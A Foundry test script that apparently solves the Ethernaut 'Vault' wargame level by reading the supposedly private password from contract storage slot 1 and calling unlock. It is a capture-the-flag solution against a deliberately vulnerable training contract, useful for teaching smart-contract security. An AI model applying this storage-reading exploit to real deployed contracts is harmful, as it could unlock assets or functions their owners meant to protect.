// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.9.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../utils/Ethernaut.sol";
import "./Vault.sol";

contract VaultSolver is Test, Ethernaut {
    function run() public {
        IS_TEST = false;
        test();
    }

    function test() public broadcasted {
        Vault instance = Vault(getLevelInstance(Levels.vault));

        bytes32 password = vm.load(address(instance), bytes32(uint256(1)));
        instance.unlock(password);

        require(validateLevelInstance(Levels.vault, address(instance)), "no validation");

        if (!IS_TEST) submitLevelInstance(address(instance));
    }
}
